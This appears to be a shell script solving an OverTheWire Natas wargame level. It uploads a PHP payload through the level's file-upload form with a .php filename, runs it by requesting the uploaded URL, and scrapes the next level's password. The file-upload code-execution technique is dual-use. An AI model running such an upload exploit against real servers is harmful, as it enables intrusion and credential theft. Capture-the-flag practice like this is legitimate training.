#!/bin/echo Please source

payloadUrl=natas12.natas.labs.overthewire.org/$(curl -s -u natas12:$natas12pass -X POST -F MAX_FILE_SIZE=1000 -F filename=payload.php -F submit="" -F uploadedfile=@natas12/payload.php natas12.natas.labs.overthewire.org | grep "The file <a href=\"upload/" | sed -rE 's;The file <a href=\"(upload/.+?\.php)\".*;\1;')
export natas13pass=$(curl -s -u natas12:$natas12pass $payloadUrl | strings | grep -E '.{32}')
echo natas13: $natas13pass
